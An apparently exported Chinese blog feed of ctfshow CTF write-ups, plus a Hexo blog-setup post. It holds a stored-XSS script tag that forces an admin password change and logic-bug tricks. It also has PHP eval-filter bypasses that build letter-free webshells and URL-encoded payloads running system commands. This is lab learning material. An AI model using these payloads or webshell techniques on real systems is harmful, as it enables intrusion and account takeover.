<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>发现一个修改密码的界面</p>
<p>自己随便注册一个账号，修改密码，抓包看见</p>
<p>GET &#x2F;api&#x2F;change.php?p&#x3D;qwe HTTP&#x2F;1.1</p>
<p>用下面这句话作为账号密码注册一个账号</p>
<script>window.open('http://127.0.0.1/api/change.php?p=123')</script>

<p>admin 123登录打开抓包看response用户管理即可发现flag，要用抓包，不然会重定向，看不到这个。可以从response中看到flag</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>逻辑漏洞转账负数金额即可-100000要是支付宝有这个漏洞就好了</p>
<p>购买flag</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>不能转负数了但是可以给自己转，bp爆破一下吧，payload set 1;</p>
<p>payloadtype number;</p>
<p>from 4  to 1000;</p>
<p>刷新看到有钱买flag</p>
<p>ctfshow{acc33993-f2a7-4216-b242-68b61f84e89a}</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>rce极限挑战</title>
    <url>/2023/04/05/rce%E6%9E%81%E9%99%90%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[<p>ctfshow rce极限挑战</p>
<p>不能用字母数字时，我们可以通过<strong>异或，取反，自增自减，或</strong>等位运算利用特殊字符构造出字母数字，再利用<strong>php动态函数名</strong>的特性来构造webshell。</p>
<p>​    <span id="more"></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &#x27;&#x27;.[];</span><br><span class="line">echo($a);//结果就为array</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">PHP在进行计算的时候认为结果是无限大时他会返回结果是:INF （ Infinite)</span><br><span class="line">这里举个列：echo (1/0);  //就会输出INF</span><br><span class="line">PHP进行计算的时候认为一个数超出Infinite，那就是: NAN( not-a-number)</span><br><span class="line">这里举个例：echo (a/a); //就会输出NAN</span><br></pre></td></tr></table></figure>

<h2 id="rce极限挑战1"><a href="#rce极限挑战1" class="headerlink" title="rce极限挑战1"></a>rce极限挑战1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;括号&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;点&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：echo <code>cat /f*</code>;</p>
<h2 id="rce极限挑战2"><a href="#rce极限挑战2" class="headerlink" title="rce极限挑战2"></a>rce极限挑战2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzz一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($a = 0; $a &lt; 256; $a++)&#123;</span><br><span class="line">    if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,chr($a)))&#123;</span><br><span class="line">        echo urlencode(chr($a)).&quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//! $ &#x27; ( ) + , . / ; = [ ] _</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray</span><br><span class="line">$__=&#x27;&#x27;;  //两个短杠赋值为空</span><br><span class="line">$_=$_[&#x27;&#x27;];//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入</span><br><span class="line">$_=++$_; //B</span><br><span class="line">$_=++$_; //C</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$_=++$_; //D</span><br><span class="line">$__.=$_; //E  把两个短杠赋值为E</span><br><span class="line">$_=++$_; //F  一个短杠继续自增</span><br><span class="line">$_=++$_; //G </span><br><span class="line">$__=$_.$__; // GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE</span><br><span class="line">$_=++$_; //H 此处一个短杠继续自增，为H</span><br><span class="line">$_=++$_; //I</span><br><span class="line">$_=++$_; //J</span><br><span class="line">$_=++$_; //k</span><br><span class="line">$_=++$_; //L</span><br><span class="line">$_=++$_; //M</span><br><span class="line">$_=++$_; //N</span><br><span class="line">$_=++$_; //O</span><br><span class="line">$_=++$_; //P</span><br><span class="line">$_=++$_; //Q</span><br><span class="line">$_=++$_; //R</span><br><span class="line">$_=++$_; //S</span><br><span class="line">$_=++$_; //T</span><br><span class="line">$__.=$_; // GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.=拼接，构成get</span><br><span class="line">$&#123;&#x27;_&#x27;.$__&#125;[_]($&#123;&#x27;_&#x27;.$__&#125;[__]); // 进行拼接，$_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]);</span><br></pre></td></tr></table></figure>

<p>根据这个写的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这是我这一题做出来的所用的</span><br><span class="line">$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ctf_showspan><br><span class="line">//然后get传_=system&amp;__=ls</span><br><span class="line">//url编码后用抓包传参，</span><br></pre></td></tr></table></figure>

<p>ctfshow{6a98d4af-f123-458a-9ad8-4fbbbb75cdd6}</p>
<h2 id="rce3"><a href="#rce3" class="headerlink" title="rce3"></a>rce3</h2><p>PHP进行计算的时候认为一个数超出Infinite，那就是: NAN( not-a-number)<br> 这里举个例：echo (a&#x2F;a); &#x2F;&#x2F;就会输出NAN</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//() + , . / 0 1 ; = [] _</span></span><br><span class="line">限制<span class="number">105</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=([].[])[0]; </span><br><span class="line">//这里就是上面的数组拼接，强制返回ArrayArray, 取第一个A</span><br><span class="line">$_=($_/$_.$_)[0]; </span><br><span class="line">//这里是关键php的计算上面有说，其实这里麻烦了，只是当时不知道, 这里返回 N</span><br><span class="line">$_++; //O</span><br><span class="line">$__=$_.$_++; </span><br><span class="line">//这里是进行了++的，所以$_等于P, $__=PO, 其实这里才是第五题的关键嘿嘿，很多74的就是卡在这</span><br><span class="line">$_++; // Q</span><br><span class="line">$_++; // R</span><br><span class="line">$_++; // S</span><br><span class="line">$_=_.$__.$_.++$_; //这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span><br><span class="line">$$_[_]($$_[1]); // $_POST[_]($_POST[1]);</span><br></pre></td></tr></table></figure>

<p>因为N下面就有post的所有字母，而且比较近</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=%24_%3D%28%5B%5D.%5B%5D%29%5B0%5D%3B%24_%3D%28%24_/%24_.%24_%29%5B0%5D%3B%24_%2B%2B%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D_.%24__.%24_.%2B%2B%24_%3B%24%24_%5B_%5D%28%24%24_%5B1%5D%29%3B&amp;_=system&amp;1=ls</span><br></pre></td></tr></table></figure>

<h2 id="rce4"><a href="#rce4" class="headerlink" title="rce4"></a>rce4</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>比上一个少了1，而且字符数要求更少了。所以需要我们压缩得更短。不影响我们使用(0&#x2F;0)来构造NAN, 但是更为优秀的写法可以是<code>$a=(_/_._)[0];</code>直接得到字母N，payload构造过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=(_/_._)[0];//直接拼接成字符串并切片</span><br><span class="line">$o=++$a;//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span><br><span class="line">$o=++$a.$o;//$o=&gt;PO,$a=&gt;P</span><br><span class="line">$a++;//Q</span><br><span class="line">$a++;//R</span><br><span class="line">$o.=++$a;//$o=&gt;POS,$a=&gt;S</span><br><span class="line">$o.=++$a;//$o=&gt;POST,$a=&gt;T</span><br><span class="line">$_=_.$o;//_POST</span><br><span class="line">$$_[0]($$_[_]);//$_POST[0]($_POST[_]);</span><br></pre></td></tr></table></figure>

<p>这位师傅写的太棒了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<h2 id="rce5"><a href="#rce5" class="headerlink" title="rce5"></a>rce5</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>fuzz脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//      $()+,./;=[]_</span></span><br></pre></td></tr></table></figure>

<p>​     phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=_(a/a)[a];//相当于gettext(0/0)[0],得到N</span><br><span class="line">$_=++$a;//O</span><br><span class="line">$_=_.++$a.$_;//_PO</span><br><span class="line">$a++;$a++;//R</span><br><span class="line">$_.=++$a.++$a;//_POST</span><br><span class="line">$$_[a]($$_[_]);//$_POST[a]($_POST[_])</span><br></pre></td></tr></table></figure>

<p>至于为什么<code>$_=$a.$a++;</code>这一步得到的是PO而不是OP，或者OO，而<code>$_=_.$a.$a++;</code>得到的是<code>_OO</code>,经过和用这种做法的师傅们讨论，目前分析下来最有可能的原因是，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，<code>$_=$a.$a++;//PO</code>这里相当于先执行了<code>$a++</code>操作（函数），并得到<code>$a++</code>的返回值，然后和左侧的<code>$a</code>变量进行拼接，此时<code>$a</code>已经是P了。而<code>$_=_.$a.$a++;</code>时先执行了<code>_</code>和<code>$a</code>的拼接，而后再执行<code>$_=&#39;_O&#39;.$a++</code>，所以得到的是<code>_OO</code>。*以上所有均为猜测，具体机制需研究PHP源码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p>注意不可见字符要抓包传参，空格换成+号</p>
<p>68位</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br><span class="line"><span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span><span class="comment">//$a直接拼接出_POST</span></span><br><span class="line"><span class="variable">$$a</span>[_POST](<span class="variable">$$a</span>[_])<span class="comment">//$_POST[_POST]($_POST[_])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</span><br></pre></td></tr></table></figure>

<p><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">CTFshow-RCE极限大挑战官方wp - 飞书云文档 (feishu.cn)</a></p>
<p>这位师傅写的好棒</p>
<p><a href="https://blog.csdn.net/qq_61955196/article/details/127932968">https://blog.csdn.net/qq_61955196/article/details/127932968</a></p>
]]></content>
  </entry>
  <entry>
    <title>博客创建</title>
    <url>/2023/01/11/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<p> layout 布置<br>    <span id="more"></span></p>
<h1 id="文章字数统计"><a href="#文章字数统计" class="headerlink" title="文章字数统计"></a>文章字数统计</h1><h3 id="Hexo-config-yml"><a href="#Hexo-config-yml" class="headerlink" title="Hexo _config.yml"></a>Hexo _config.yml</h3><p>在文件尾部添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="NexT-config-yml"><a href="#NexT-config-yml" class="headerlink" title="NexT _config.yml"></a>NexT _config.yml</h3><p>修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/next-theme/hexo-word-counter</span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_total: false</span><br></pre></td></tr></table></figure>

<p>设置<code>item_text_total</code>为<code>true</code></p>
<h1 id="打赏功能实现"><a href="#打赏功能实现" class="headerlink" title="打赏功能实现"></a>打赏功能实现</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Donate (Sponsor) settings</span><br><span class="line"># Front-matter variable (unsupport animation).</span><br><span class="line">reward_settings:</span><br><span class="line">  # If true, a donate button will be displayed in every article by default.</span><br><span class="line">  enable: false</span><br><span class="line">  animation: false</span><br><span class="line">  #comment: Buy me a coffee</span><br><span class="line"></span><br><span class="line">reward:</span><br><span class="line">  #wechatpay: /images/wechatpay.png</span><br><span class="line">  #alipay: /images/alipay.png</span><br><span class="line">  #paypal: /images/paypal.png</span><br><span class="line">  #bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure>

<p>设置属性<code>enable</code>为<code>true</code>，<code>animation</code>为<code>true</code>，添加<code>comment</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable: true</span><br><span class="line">comment: Buy me a coffee</span><br></pre></td></tr></table></figure>

<p>将微信支付和支付宝支付的截图放置在主题包下<code>source/images</code>文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wechatpay: /images/wechatpay.jpg</span><br><span class="line">alipay: /images/alipay.jpg</span><br><span class="line">#bitcoin: /images/bitcoin.jpg</span><br></pre></td></tr></table></figure>

<h1 id="live2d"><a href="#live2d" class="headerlink" title="live2d"></a>live2d</h1><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>npm install –save hexo-helper-live2d</p>
<h3 id="下载model文件"><a href="#下载model文件" class="headerlink" title="下载model文件"></a>下载model文件</h3><p>npm install live2d-widget-model-shizuku</p>
<h4 id="添加live2d看板娘到hexo"><a href="#添加live2d看板娘到hexo" class="headerlink" title="添加live2d看板娘到hexo"></a>添加live2d看板娘到hexo</h4><p>配置Hexo的主<code>_config.yml</code>或者使用的主题的<code>_config.yml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Live2D看板娘</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    #模板目录，在node_modules里</span><br><span class="line">    use: live2d-widget-model-shizuku  </span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 300 </span><br><span class="line">    height: 600</span><br><span class="line">  mobile:</span><br><span class="line">    # 在手机端显示</span><br><span class="line">    show: false   </span><br><span class="line">  rect:</span><br><span class="line">    opacity:0.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/">六角形-NexT (hexo-next.readthedocs.io)</a></p>
<p><a href="https://markdown.com.cn/basic-syntax/">Markdown 基本语法 | Markdown 官方教程</a></p>
<h1 id="爱心特效"><a href="#爱心特效" class="headerlink" title="爱心特效"></a>爱心特效</h1><p><a href="https://benn314.github.io/2022/11/22/Hexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E5%8A%A8%E7%94%BB">Hexo-Next主题配置教程 | Ben’s Blog (benn314.github.io)</a></p>
<p>在 <strong>&#x2F;themes&#x2F;next&#x2F;source&#x2F;js&#x2F;</strong> 下新建文件 <code>clicklove.js</code> 并添加代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在 <strong>\themes\next\layout_layout.njk</strong> 文件末尾添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clicklove.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="鼠标跟随特效"><a href="#鼠标跟随特效" class="headerlink" title="鼠标跟随特效"></a>鼠标跟随特效</h1><p><a href="https://sweetolive.github.io/2020/07/17/1/">Hexo next主题添加鼠标特效 | 佘一人 (sweetolive.github.io)</a></p>
